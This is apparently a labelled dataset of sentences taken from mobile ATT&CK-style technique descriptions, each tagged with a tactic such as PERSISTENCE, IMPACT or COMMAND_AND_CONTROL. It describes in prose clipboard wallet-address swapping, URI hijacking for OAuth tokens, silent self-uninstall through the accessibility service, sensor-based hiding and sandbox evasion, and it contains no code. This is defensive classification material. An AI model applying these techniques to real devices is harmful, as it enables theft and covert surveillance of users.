"Querying the `WiFiInfo` API requires the application to hold the `ACCESS_FINE_LOCATION` permission. 

* `BluetoothAdapter` for information about Bluetooth devices, which also requires the application to hold several permissions granted by the user at runtime. 

* For Android versions prior to Q, applications can use the `TelephonyManager.getNeighboringCellInfo()` method.",DISCOVERY,,,
"For Q and later, applications can use the `TelephonyManager.getAllCellInfo()` method.",DISCOVERY,,,
Both methods require the application hold the `ACCESS_FINE_LOCATION` permission.,DISCOVERY,,,
Adversaries may execute their own malicious payloads by hijacking the way an operating system run applications.,PERSISTENCE,,,
Hijacking execution flow can be for the purposes of persistence since this hijacked execution may reoccur at later points in time.,PERSISTENCE,,,
"On Android, adversaries may overwrite the standard OS API library with a malicious alternative to hook into core functions to achieve persistence.",PERSISTENCE,,,
"By doing this, the adversary’s code will be executed every time the overwritten API function is called by an app on the infected device.",PERSISTENCE,,,
Adversaries may alter data en route to storage or other systems in order to manipulate external outcomes or hide activity.,IMPACT,,,
"By manipulating transmitted data, adversaries may attempt to affect a business process, organizational understanding, or decision making.",IMPACT,,,
Manipulation may be possible over a network connection or between system processes where there is an opportunity to deploy a tool that will intercept and change information.,IMPACT,,,
One method to achieve [Transmitted Data Manipulation] is by modifying the contents of the device clipboard.,IMPACT,,,
Malicious applications may monitor clipboard activity through the `ClipboardManager.OnPrimaryClipChangedListener` interface on Android to determine when clipboard contents have changed.,IMPACT,,,
"Listening to clipboard activity, reading clipboard contents, and modifying clipboard contents requires no explicit application permissions and can be performed by applications running in the background.",IMPACT,,,
"However, this behavior has changed with the release of Android 10.",IMPACT,,,
Adversaries may use [Transmitted Data Manipulation] to replace text prior to being pasted.,IMPACT,,,
"For example, replacing a copied Bitcoin wallet address with a wallet address that is under adversarial control.

[Transmitted Data Manipulation] was seen within the Android/Clipper.C trojan.",IMPACT,,,
This sample was detected by ESET in an application distributed through the Google Play Store targeting cryptocurrency wallet numbers.,IMPACT,,,
Adversaries may register Uniform Resource Identifiers (URIs) to intercept sensitive data.,CREDENTIAL_ACCESS,,,
"Applications regularly register URIs with the operating system to act as a response handler for various actions, such as logging into an app using an external account via single sign-on.",CREDENTIAL_ACCESS,,,
This allows redirections to that specific URI to be intercepted by the application.,CREDENTIAL_ACCESS,,,
"If an adversary were to register for a URI that was already in use by a genuine application, the adversary may be able to intercept data intended for the genuine application or perform a phishing attack against the genuine application.",CREDENTIAL_ACCESS,,,
Intercepted data may include OAuth authorization codes or tokens that could be used by the adversary to gain access to protected resources.,CREDENTIAL_ACCESS,,,
Adversaries may include functionality in malware that uninstalls the malicious application from the device.,DEFENSE_EVASION,,,
"This can be achieved by: 
 
* Abusing device owner permissions to perform silent uninstallation using device owner API calls. 
* Abusing root permissions to delete files from the filesystem. 
* Abusing the accessibility service.",DEFENSE_EVASION,,,
"This requires sending an intent to the system to request uninstallation, and then abusing the accessibility service to click the proper places on the screen to confirm uninstallation.",DEFENSE_EVASION,,,
Unix shells are the underlying command prompts on Android and iOS devices.,EXECUTION,,,
"Unix shells can control every aspect of a system, with certain commands requiring elevated privileges that are only accessible if the device has been rooted or jailbroken.",EXECUTION,,,
Interactive shells may be accessed through command and control channels or during lateral movement such as with SSH.,EXECUTION,,,
"If the device has been rooted or jailbroken, adversaries may locate and invoke a superuser binary to elevate their privileges and interact with the system as the root user.",EXECUTION,,,
This dangerous level of permissions allows the adversary to run special commands and modify protected system files.,EXECUTION,,,
Adversaries may attempt to avoid detection by hiding malicious behavior from the user.,DEFENSE_EVASION,,,
"By doing this, an adversary’s modifications would most likely remain installed on the device for longer, allowing the adversary to continue to operate on that device.",DEFENSE_EVASION,,,
"While there are many ways this can be accomplished, one method is by using the device’s sensors.",DEFENSE_EVASION,,,
"By utilizing the various motion sensors on a device, such as accelerometer or gyroscope, an application could detect that the device is being interacted with.",DEFENSE_EVASION,,,
"That way, the application could continue to run while the device is not in use but cease operating while the user is using the device, hiding anything that would indicate malicious activity was ongoing.",DEFENSE_EVASION,,,
"Accessing the sensors in this way does not require any permissions from the user, so it would be completely transparent.",DEFENSE_EVASION,,,
An adversary can leverage a device’s cameras to gather information by capturing video recordings.,COLLECTION,,,
"Images may also be captured, potentially in specified intervals, in lieu of video files.",COLLECTION,,,
Malware or scripts may interact with the device cameras through an available API provided by the operating system.,COLLECTION,,,
This technique differs from [Screen Capture] due to use of the device’s cameras for video recording rather than capturing the victim’s screen.,COLLECTION,,,
"In Android, an application must hold the `android.permission.CAMERA` permission to access the cameras.",COLLECTION,,,
"In iOS, applications must include the `NSCameraUsageDescription` key in the `Info.plist` file.",COLLECTION,,,
"In both cases, the user must grant permission to the requesting application to use the camera.",COLLECTION,,,
"If the device has been rooted or jailbroken, an adversary may be able to access the camera without knowledge of the user.",COLLECTION,,,
Adversaries may employ various means to detect and avoid virtualization and analysis environments.,DEFENSE_EVASION,,,
This may include changing behaviors after checking for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox.,DEFENSE_EVASION,,,
"If the adversary detects a VME, they may alter their malware’s behavior to disengage from the victim or conceal the core functions of the payload.",DEFENSE_EVASION,,,
They may also search for VME artifacts before dropping further payloads.,DEFENSE_EVASION,,,
Adversaries may use the information learned from [Virtualization/Sandbox Evasion] during automated discovery to shape follow-on behaviors.,DEFENSE_EVASION,,,
Adversaries may use several methods to accomplish [Virtualization/Sandbox Evasion] such as checking for system artifacts associated with analysis or virtualization.,DEFENSE_EVASION,,,
Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment.,DEFENSE_EVASION,,,
Adversaries may communicate using application layer protocols associated with web protocols traffic to avoid detection/network filtering by blending in with existing traffic.,COMMAND_AND_CONTROL,,,
"Commands to remote mobile devices, and often the results of those commands, will be embedded within the protocol traffic between the mobile client and server.",COMMAND_AND_CONTROL,,,
"Web protocols such as HTTP and HTTPS are used for web traffic as well as well as notification services native to mobile messaging services such as Google Cloud Messaging (GCM) and newly, Firebase Cloud Messaging (FCM), (GCM/FCM: two-way communication) and Apple Push Notification Service (APNS; one-way server-to-device).",COMMAND_AND_CONTROL,,,
Such notification services leverage HTTP/S via the respective API and are commonly abused on Android and iOS respectively in order blend in with routine device traffic making it difficult for enterprises to inspect.,COMMAND_AND_CONTROL,,,
"Use of Web services may also protect back-end C2 infrastructure from discovery through malware binary analysis, or enable operational resiliency (since this infrastructure may be dynamically changed).",COMMAND_AND_CONTROL,,,
